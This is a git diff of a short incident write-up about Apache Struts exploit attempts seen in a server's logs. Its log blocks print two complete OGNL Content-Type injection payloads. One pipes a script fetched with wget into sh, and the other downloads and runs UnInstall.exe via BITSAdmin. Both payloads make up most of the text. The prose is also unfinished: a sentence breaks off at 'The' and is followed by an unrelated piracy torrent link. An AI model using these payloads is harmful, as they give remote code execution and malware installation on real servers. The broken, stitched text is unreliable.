@@ -1,3 +1,6 @@
+# Struts Exploit
+
+## Summary
 While looking through the logs of one of our servers, we encountered these entries, spaced one second apart.
 
 I downloaded the binaries from the urls listed in the exploit attempts. I downloaded two files, one from each of the drive-by exploit attempts. The first URL was targeted towards Linux Based systems, and the second was targeting Windows based systems. They are both attempting to exploit a recently discovered vulnerability in the Apache Struts MVC framework. 
@@ -13,6 +16,12 @@ The attempts were executed at 06:19:02 UTC, from the locale of the origin IP add
 
 This ip address sent two packets, which would download from two different ip addresses, embedded in the modified Content-Type header field. The first was targeted towards systems built on *nix based servers, and the second was targeted towards systems built on Windows based servers
 
+I downloaded the `a` script from the ip address 65.254.63.20, and received a shell script. The first thing it does is to add the present working directory for instance to the path.
+
+The second contains a binary named `UnInstall.exe`. The 
+https://thepiratebay.org/torrent/16135858/The_Elder_Scrolls_V_Skyrim_Special_Edition-CODEX
+
+## Log Entries
 ```
 ---BEGIN---
     Wed Mar 22 2017 06:19:02 GMT+0000 (UTC)
@@ -23,14 +32,6 @@ This ip address sent two packets, which would download from two different ip add
     Accept: undefined
     Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://65.254.63.20/a|sh ; rm -rf a ; curl -O http://65.254.63.20/a ; sh a ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
     Content Length: undefined
-```
-I downloaded the `a` script from the ip address 65.254.63.20, and received a shell script. The first thing it does is to add the present working directory for instance to the path.
-
-
-
-
-
-```
 ---BEGIN---
     Wed Mar 22 2017 06:19:02 GMT+0000 (UTC)
     New Connection 220.191.231.222 -> ###.###.###.###
@@ -41,6 +42,5 @@ I downloaded the `a` script from the ip address 65.254.63.20, and received a she
     Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='BITSAdmin.exe /Transfer JOB http://82.165.129.119/UnInstall.exe %TEMP%/UnInstall.exe & %TEMP%/UnInstall.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
     Content Length: undefined
 ```
-The second contains a binary named `UnInstall.exe`. The 
-https://thepiratebay.org/torrent/16135858/The_Elder_Scrolls_V_Skyrim_Special_Edition-CODEX
 
+## Analysis
